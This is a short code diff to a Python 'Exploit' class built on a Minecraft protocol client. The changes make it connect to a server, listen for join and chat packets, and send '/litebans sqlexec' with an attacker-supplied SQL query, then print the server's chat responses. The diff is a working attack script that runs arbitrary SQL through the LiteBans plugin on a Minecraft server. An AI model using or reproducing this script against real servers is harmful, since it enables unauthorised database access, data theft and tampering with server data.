@@ -12,16 +12,27 @@ class Exploit:
         self.client = client
         self.success = False
 
-    def waitForResponse(self):
-        #: check for flag
-        pass
+    def onJoin(self, dog):
+        print('Connected', dog)
+
+    def waitForResponse(self, chat_packet):
+        print("Message (%s): %s" % (chat_packet.field_string('position'), chat_packet.json_data))
 
     def execute(self) -> tuple[bool, str]:
         self.client.register_packet_listener(
             self.waitForResponse, minecraft.networking.packets.ChatMessagePacket)  #: on chat, receive event
 
+        self.client.register_packet_listener(
+            self.onJoin, minecraft.networking.packets.JoinGamePacket)
+
+        self.client.connect()
+
+        input('Press enter joined.')
+
         packet = minecraft.networking.packets.ChatPacket()  #: chat packet structure
         packet.message = "/litebans sqlexec {}".format(self.query)  #: assigns packet sql query
         self.client.write_packet(packet)  #: sends message
+
+        input('Press enter wen response.')
 
         return True, "Success in Message"
